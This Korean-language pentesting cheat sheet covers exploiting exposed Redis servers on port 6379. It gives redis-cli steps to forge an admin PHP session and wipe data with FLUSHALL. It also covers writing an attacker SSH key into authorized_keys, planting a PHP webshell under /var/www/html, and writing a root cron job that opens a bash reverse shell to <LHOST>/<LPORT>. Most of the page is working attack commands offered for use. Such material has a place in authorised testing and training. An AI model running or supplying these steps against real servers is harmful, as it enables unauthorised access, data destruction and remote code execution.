---
sidebar_position: 12
---

# Redis - 6379

## 기본 정보

**포트**: 6379

Redis는 인메모리 키-값 데이터베이스입니다.

## 연결

```bash
# Redis CLI 연결
redis-cli -h <RHOST>

# 포트 지정
redis-cli -h <RHOST> -p 6379

# 비밀번호 지정
redis-cli -h <RHOST> -a <PASSWORD>
```

## 인증

```bash
# 비밀번호 인증
> AUTH <PASSWORD>

# 사용자명 + 비밀번호 (Redis 6.0+)
> AUTH <USERNAME> <PASSWORD>
```

## 기본 명령어

```bash
# 서버 정보
> INFO SERVER

# Keyspace 정보
> INFO keyspace

# 모든 설정 확인
> CONFIG GET *

# 데이터베이스 선택
> SELECT <NUMBER>

# 모든 키 조회
> KEYS *

# 키 값 조회
> GET <KEY>
```

## Hash 명령어

```bash
# 필드 설정
> HSET <KEY> <FIELD> <VALUE>

# 필드 값 조회
> HGET <KEY> <FIELD>

# 모든 필드 이름 조회
> HKEYS <KEY>

# 모든 필드와 값 조회
> HGETALL <KEY>
```

## PHP 세션 조작

```bash
# 세션 조회
> GET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b

# 세션 설정 (관리자 권한 상승)
> SET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b "username|s:8:\"<USERNAME>\";role|s:5:\"admin\";auth|s:4:\"True\";"

# 주의: "s:8"은 사용자명 길이와 일치해야 함
```

## SSH Key 삽입

```bash
# Redis CLI 연결
redis-cli -h <RHOST>

# 기존 데이터 삭제
echo "FLUSHALL" | redis-cli -h <RHOST>

# SSH 공개키 준비
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/spub.txt

# Redis에 키 저장
cat /tmp/spub.txt | redis-cli -h <RHOST> -x set s-key

# Redis 내부에서 작업
redis-cli -h <RHOST>
```

```bash
# 키 확인
<RHOST>:6379> get s-key

# 현재 디렉토리 확인
<RHOST>:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis"

# .ssh 디렉토리로 변경
<RHOST>:6379> CONFIG SET dir /var/lib/redis/.ssh
OK

# 파일명을 authorized_keys로 설정
<RHOST>:6379> CONFIG SET dbfilename authorized_keys
OK

# 설정 확인
<RHOST>:6379> CONFIG GET dbfilename
1) "dbfilename"
2) "authorized_keys"

# 저장
<RHOST>:6379> save
OK
```

```bash
# SSH 로그인
ssh redis@<RHOST>
```

## Webshell 작성

```bash
# PHP Webshell 작성
redis-cli -h <RHOST>
> CONFIG SET dir /var/www/html
> CONFIG SET dbfilename shell.php
> SET test "<?php system($_GET['cmd']); ?>"
> save

# 접속: http://<RHOST>/shell.php?cmd=id
```

## Cron Job을 통한 RCE

```bash
redis-cli -h <RHOST>
> CONFIG SET dir /var/spool/cron
> CONFIG SET dbfilename root
> SET xxx "\n* * * * * bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\n"
> save
```

## Nmap

```bash
# Redis 버전 확인
sudo nmap -p6379 -sV <RHOST>

# Redis 정보 수집
sudo nmap -p6379 --script redis-info <RHOST>
```

## redis-cli 원격 명령 실행

```bash
# 명령 실행
redis-cli -h <RHOST> INFO
redis-cli -h <RHOST> CONFIG GET *
redis-cli -h <RHOST> KEYS *
```

## 참고

- 인증 없는 Redis 확인
- CONFIG 명령 사용 가능 여부
- Redis 실행 사용자 확인 (root인 경우 더 위험)
- 쓰기 가능한 디렉토리 확인
- PHP 세션 조작을 통한 권한 상승
- SSH Key 삽입
- Webshell 작성
- Cron Job 악용
